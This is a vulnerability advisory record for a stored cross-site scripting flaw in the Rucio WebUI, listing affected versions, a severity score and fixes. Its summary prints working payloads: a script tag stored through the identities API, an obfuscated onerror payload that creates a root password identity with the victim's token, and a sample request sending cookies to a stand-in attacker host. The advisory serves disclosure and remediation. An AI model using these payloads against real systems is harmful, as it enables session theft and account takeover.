advisory_id: GHSA-8wpv-6x3f-3rm5
datasource_id: github_osv_importer_v2/GHSA-8wpv-6x3f-3rm5
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-8wpv-6x3f-3rm5/GHSA-8wpv-6x3f-3rm5.json
aliases:
  - CVE-2026-25735
summary: "Rucio WebUI has a Stored Cross-site Scripting (XSS) vulnerability its Identity Name\n\
  ### Summary\nA stored Cross-site Scripting (XSS) vulnerability was identified in the Identity\
  \ Name of the WebUI where attacker-controlled input is persisted by the backend and later\
  \ rendered in the WebUI without proper output encoding. This allows arbitrary JavaScript execution\
  \ in the context of the WebUI for users who view affected pages, potentially enabling session\
  \ token theft or unauthorized actions.\n\n---\n### Details\nThe identity name is stored and\
  \ later rendered without output encoding.\n\n**Create Path**:  \nAdmin > Account Management\
  \ > _ACCOUNT NAME_ > Add Account Identity\n\n**Trigger Path**:  \nAdmin > Account Management\
  \ > _ACCOUNT NAME_  \n(`https://127.0.0.1:8443/ui/account?account=pentest`)\n\n**Request**\n\
  ```http\nPOST /proxy/accounts/pentest/identities HTTP/1.1\n...\n{\"identity\":\"<script>alert(document.cookie)</script>\"\
  ,\"authtype\":\"SSH\",\"email\":\"Test\"}\n```\n\n**Response**\n```http\nHTTP/1.1 201 CREATED\n\
  ...\nCreated\n```\n\n**Storing XSS payload in account identity name**\n<img width=\"1385\"\
  \ height=\"807\" alt=\"Storing XSS payload in account identity name\" src=\"https://github.com/user-attachments/assets/e4209ef4-fd88-492f-9fb0-afb7d04b15ce\"\
  \ />\n\n**Triggering XSS payload when viewing account**\n<img width=\"1395\" height=\"745\"\
  \ alt=\"Triggering XSS payload when viewing account\" src=\"https://github.com/user-attachments/assets/e6217669-a0f7-4aba-bb05-f4fb7049611c\"\
  \ />\n\n---\n### Impact\nAny authenticated user who views affected resources may execute attacker-controlled\
  \ JavaScript in the WebUI origin. Depending on the affected feature, this may impact all users\
  \ or administrative users only.\n\nThe impact is amplified by:\n- Session cookies that are\
  \ accessible to JavaScript (missing HttpOnly flag).\n- API tokens exposed to the WebUI via\
  \ JavaScript variables.\n\nAn attacker would likely attempt to exfiltrate the session token\
  \ to an external site by setting an encoded version of the cookie as the path of a GET request\
  \ to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).\n\
  \nAttackers can also perform actions as the victim like creating a new UserPass identity with\
  \ an attacker known password, creating/deleting an RSE, or exfiltrating data.\n\n**XSS Payload\
  \ to Create Root UserPass**\n```html\n<img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()>\n\
  ```\n\n---\n### Remediation / Mitigation\nAll client-side renderings of server-provided or\
  \ user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe\
  \ methods such as `.html()` should be avoided unless the content is explicitly sanitized.\
  \ Safer alternatives include `.text()`, creating text nodes, or using a templating system\
  \ that enforces automatic escaping.\n\nAdditional defense-in-depth measures include:\n- Enforcing\
  \ a strict Content Security Policy (CSP).\n- Setting the HttpOnly flag on session cookies.\n\
  - Avoiding exposure of API tokens in JavaScript-accessible variables.\n\n> Note that many\
  \ pages were found setting the API token as `token` in an authenticated response like `var\
  \ token = \"root-root-webui-...:\"` (See `/ui/list_accounts` for example)\n\n---\n### References\n\
  - OWASP XSS Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)"
impacted_packages:
  - purl: pkg:pypi/rucio-webui
    affected_versions: vers:pypi/<35.8.3
    fixed_versions: vers:pypi/35.8.3
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/rucio-webui
    affected_versions: vers:pypi/>=36.0.0rc1|<38.5.4
    fixed_versions: vers:pypi/38.5.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/rucio-webui
    affected_versions: vers:pypi/>=39.0.0rc1|<39.3.1
    fixed_versions: vers:pypi/39.3.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '6.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-8wpv-6x3f-3rm5/GHSA-8wpv-6x3f-3rm5.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-1004
  - CWE-79
references:
  - url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio/releases/tag/35.8.3
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio/releases/tag/38.5.4
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio/releases/tag/39.3.1
    reference_type:
    reference_id:
  - url: https://github.com/rucio/rucio/security/advisories/GHSA-8wpv-6x3f-3rm5
    reference_type:
    reference_id:
